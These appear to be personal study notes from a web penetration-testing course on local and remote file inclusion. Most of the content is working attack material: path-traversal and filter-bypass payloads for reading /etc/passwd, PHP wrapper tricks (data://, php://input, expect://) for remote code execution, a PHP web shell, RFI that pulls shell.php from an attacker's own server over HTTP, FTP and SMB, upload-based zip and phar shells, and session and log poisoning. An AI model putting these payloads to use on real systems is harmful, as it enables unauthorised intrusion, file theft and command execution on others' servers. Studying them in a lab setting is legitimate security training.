# Broken code 

- The following table shows which functions may execute files and which only read file content

| **Function**                 | **Read Content** | **Execute** | **Remote URL** |
| ---------------------------- | :--------------: | :---------: | :------------: |
| **PHP**                      |                  |             |                |
| `include()`/`include_once()` |        ✅         |      ✅      |       ✅        |
| `require()`/`require_once()` |        ✅         |      ✅      |       ❌        |
| `file_get_contents()`        |        ✅         |      ❌      |       ✅        |
| `fopen()`/`file()`           |        ✅         |      ❌      |       ❌        |
| **NodeJS**                   |                  |             |                |
| `fs.readFile()`              |        ✅         |      ❌      |       ❌        |
| `fs.sendFile()`              |        ✅         |      ❌      |       ❌        |
| `res.render()`               |        ✅         |      ✅      |       ❌        |
| **Java**                     |                  |             |                |
| `include`                    |        ✅         |      ❌      |       ❌        |
| `import`                     |        ✅         |      ✅      |       ✅        |
| **.NET**                     |                  |             |                |
| `@Html.Partial()`            |        ✅         |      ❌      |       ❌        |
| `@Html.RemotePartial()`      |        ✅         |      ❌      |       ✅        |
| `Response.WriteFile()`       |        ✅         |      ❌      |       ❌        |
| `include`                    |        ✅         |      ✅      |       ✅        |
# Local File Inclusion (LFI)

## Basic LFI

- this is a web app that allows users to set their language to either English or Spanish

![i](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/23/basic_lfi_lang.png)


- the web app uses the `?language` parameter to change the language of display , so if the web app is pulling a file that is now being included in the page we can use this palyload to get an `LFI`

```sh
/etc/passwd on Linux and 
C:\Windows\boot.ini on Windows
```

- the attack was successful

![i](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/23/basic_lfi_lang_passwd.png)

- so the vulnerable code may look like this 

```php
include($_GET['language']);
```
## Path Traversal

In the earlier example, we read a file by specifying its `absolute path` but now it didn't work 

![i](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/23/traversal_passwd_failed.png)

- as expected it give us errors , so we need to use path traversal to get ower file

```sh
../../../../etc/passwd
```

- the attack was successful

![i](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/23/traversal_passwd.png)

- so the vulnerable code may look like this  

```php
include("./languages/" . $_GET['language']);
```

## Filename Prefix

- in some cases ower input may be used with a prefix to get the full filename , in this case when we try `../../../etc/passwd` it give errors cuz the final string would be `lang_../../../etc/passwd`

![i](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/23/lfi_another_example1.png)

- so, instead of directly using path traversal, we can prefix a `/` before our payload

![i](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/23/lfi_another_example_passwd1.png)

## Second-Order Attacks

- a web application may allow us to download our avatar through a URL like (`/profile/$username/avatar.png`). If we craft a malicious LFI username (e.g. `../../../etc/passwd`) we get the passwd file
# Basic Bypasses

## Non-Recursive Path Traversal Filters

- we used `../../../../etc/passwd` as we can see `../` substrings were removed

![i](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/23/lfi_blacklist.png)

- we can use `....//` as our payload

![i](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/23/lfi_blacklist_passwd.png)

- As we can see we get a success , so the vulnerable code may look like this 

```php
$language = str_replace('../', '', $_GET['language']);
```

- we can also uses this payloads 

```sh
..././
....\/
....\/
....////
```

## Encoding

- we can encode our payload 
  
![i](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/23/burp_url_encode.jpg)

![i](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/23/lfi_blacklist_passwd_filter.png)

## Approved Paths

- web applications may also use Regular Expressions

```php
if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
    include($_GET['language']);
} else {
    echo 'Illegal path specified!';
}
```

- the web app only accept paths that are under the `./languages` directory , so we use this payload to bypass it

```sh
/languages/../../../../etc/passwd
```

![i](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/23/lfi_blacklist_passwd_filter.png)

## Appended Extensions

- sometimes extension is appended to the `language` parameter

```php
include($_GET['language'] . ".php");
```

- we may not be able to bypass this and will be restricted to only reading files in that extension, which may still be useful but using Path Truncation

```sh
?language=non_existing_directory/../../../etc/passwd/./././././ REPEATED ~2048 times]
```

- automate the creation of this string with the following command

```sh
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
```

#### Null Bytes

- we can use `null byte injection` with this payload 

```sh
/etc/passwd%00.php
```

# PHP Filters

## Input Filters

- we use `php://filter/` to apply filters
- `resource` and `read`. The `resource` parameter is required for filter wrappers
- `convert.base64-encode` is usuful filter for `LFI` attacks 

## Source Code Disclosure

- we can use this payload to read the `config.php`

```php
php://filter/read=convert.base64-encode/resource=config
```

# PHP Wrappers

## Data

- The [data](https://www.php.net/manual/en/wrappers.data.php) wrapper can be used to include external data , to use the `data` filter we need to check `allow_url_include` is enabled

```sh
/etc/php/X.Y/apache2/php.ini -> apache
/etc/php/X.Y/fpm/php.ini -> Nginx
```

- command used 

```sh
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```

- After check `allow_url_include` is enabled Remote Code Execution we can do RCE 

```sh
echo '<?php system($_GET["cmd"]); ?>' | base64
```

```sh
curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
```

## Input

- the `input` wrapper uses POST request's data and it also need `allow_url_include` 

```sh
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
```

## Expect

- this wrapper need `expect` to be enabled

```sh
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
```

```sh
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id" | grep uid
```

# Remote File Inclusion (RFI)

## Local vs. Remote File Inclusion

|**Function**|**Read Content**|**Execute**|**Remote URL**|
|---|:-:|:-:|:-:|
|**PHP**||||
|`include()`/`include_once()`|✅|✅|✅|
|`file_get_contents()`|✅|❌|✅|
|**Java**||||
|`import`|✅|✅|✅|
|**.NET**||||
|`@Html.RemotePartial()`|✅|❌|✅|
|`include`|✅|✅|✅|

## Verify RFI

```sh
 echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
```

## Remote Code Execution with RFI

### HTTP
- we make ower php shell

```sh
 echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

- then we start the web server

```sh
 sudo python3 -m http.server <LISTENING_PORT>
```

- here we GET the RFI 

![i](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/23/rfi_localhost.jpg)

- using this payload 

```sh
?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
```

### FTP

```sh
sudo python -m pyftpdlib -p 21
```

![i](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/23/rfi_localhost.jpg)

- payload used 

```sh
language=ftp://user:pass@<OUR_IP>/shell.php&cmd=id
```

### SMB

- If the vulnerable web application is hosted on a Windows server we can use `SMB` to achive an `RCE`
- first we start the smb server 

```sh
 impacket-smbserver -smb2support share $(pwd)
```

- then we use this payload 

```sh
?language=\\<OUR_IP>\share\shell.php&cmd=whoami
```

# LFI and File Uploads

- the following are the functions that allow executing code

| **Function**                 | **Read Content** | **Execute** | **Remote URL** |
| ---------------------------- | :--------------: | :---------: | :------------: |
| **PHP**                      |                  |             |                |
| `include()`/`include_once()` |        ✅         |      ✅      |       ✅        |
| `require()`/`require_once()` |        ✅         |      ✅      |       ❌        |
| **NodeJS**                   |                  |             |                |
| `res.render()`               |        ✅         |      ✅      |       ❌        |
| **Java**                     |                  |             |                |
| `import`                     |        ✅         |      ✅      |       ✅        |
| **.NET**                     |                  |             |                |
| `include`                    |        ✅         |      ✅      |       ✅        |

- uploading a zip file

```sh
 echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

- we can use this payload to achive `RCE`

```sh
zip://./profile_images/shell.jpg%23shell.php&cmd=id
```

## Phar Upload

- we can use the `phar://`

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

- then we compile it 

```sh
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

# Log Poisoning

## PHP Session Poisoning

- `PHPSESSID` cookies are stored under `var/lib/php/sessions/` on Linux and in `C:\Windows\Temp\`

- cookie with the `sess_` prefix. For example, if the `PHPSESSID` cookie is set to `el4ukv0kqbvoirg7nkp4dncpk3`, then its location on disk would be `/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3`
- when we read it with the LFI
![i](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/23/rfi_session_include.png)

- no we change the value of the page by doing

```sh
http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning
```

![i](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/23/lfi_poisoned_sessid.png)


- so we do a web shell

```sh
http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```

- then by visiting 

```sh
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
```

![i](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/23/rfi_session_id.png)

## Server Log Poisoning

- `Apache` logs are located in `/var/log/apache2/` on Linux and in `C:\xampp\apache\logs\` on Windows
- `Nginx` logs are located in `/var/log/nginx/` on Linux and in `C:\nginx\log\` on Windows
- we can use https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI to find other paths

![i](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/23/rfi_repeater_ua.png)

- we successufly poisoned the logs using the `User-Agent` header
- now we use this payload to get a web shell

```sh
 echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
 
 curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison
```

![i](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/23/rfi_id_repeater.png)

- The following are some of the service logs we may be able to read

```sh
/var/log/sshd.log
/var/log/mail
/var/log/vsftpd.log
```

# Automated Scanning

## Fuzzing Parameters

```sh
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value
```

## LFI wordlists

```sh
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ'
```

## Fuzzing Server Files

### Server Webroot

```sh
ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php'
```

### Server Logs/Configurations

```sh
ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
```

